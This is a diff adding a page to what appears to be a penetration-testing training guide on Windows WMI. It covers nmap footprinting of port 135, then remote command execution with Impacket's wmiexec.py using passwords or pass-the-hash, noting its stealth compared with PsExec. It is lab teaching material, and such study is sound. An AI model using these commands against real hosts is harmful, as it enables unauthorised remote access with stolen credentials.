@@ -1,0 +1,67 @@
+# WMI
+
+> WMI is the master control interface for Windows — read and write access to almost every setting on the system. For an attacker with credentials, that translates directly into remote command execution, and tools like `wmiexec.py` turn it into a shell.
+
+<Note>**Protocol:** TCP · **Port:** 135 (then a random high port)</Note>
+
+---
+
+## What Is WMI?
+
+**Windows Management Instrumentation (WMI)** is Microsoft's implementation and extension of the **Common Information Model (CIM)** — the core of the standardized **WBEM** (Web-Based Enterprise Management) framework, adapted for Windows.
+
+WMI provides **read and write access to almost every setting** on a Windows system. That makes it the single most critical interface for administering and remotely maintaining Windows machines, whether PCs or servers — and exactly why it's so valuable to an attacker.
+
+It's typically accessed through **PowerShell**, **VBScript**, or the **WMIC** console. WMI isn't one program — it's a collection of programs and databases (repositories) working together.
+
+---
+
+## Footprinting the Service
+
+WMI communication always **initializes on TCP port 135**, then moves to a randomly assigned high port once the connection is established. That two-stage behavior is the tell when you see it in a scan.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+nmap -sV -p135 10.129.14.128
+```
+
+```
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+```
+
+### wmiexec.py — Remote Command Execution
+
+Impacket's `wmiexec.py` uses WMI to execute commands on a remote host with valid credentials, giving you a semi-interactive shell:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+wmiexec.py admin:Password123@10.129.14.128
+```
+
+```
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+C:\>whoami
+inlanefreight\admin
+```
+
+<Tip>
+  `wmiexec.py` runs each command as a new process via WMI rather than holding an open session, which makes it **stealthier than PsExec** — it doesn't create a service on the target. It also supports pass-the-hash (`-hashes :<NTLM>`), so a recovered hash works in place of a password.
+</Tip>
+
+---
+
+## Quick Reference
+
+| Command                                | Purpose                     |
+| -------------------------------------- | --------------------------- |
+| `nmap -sV -p135 <ip>`                  | Detect the WMI/RPC endpoint |
+| `wmiexec.py user:pass@<ip>`            | Remote command execution    |
+| `wmiexec.py -hashes :<NTLM> user@<ip>` | Execute via pass-the-hash   |
+
+**The footprinting flow:** nmap for port 135 → execute commands remotely with wmiexec.py using found credentials or a recovered hash. Remember WMI moves to a random high port after the initial 135 handshake.
+
+---
+
+_This concludes the Services chapter. Each protocol page stands on its own — when you see a port open, jump straight to its page for the footprinting flow._
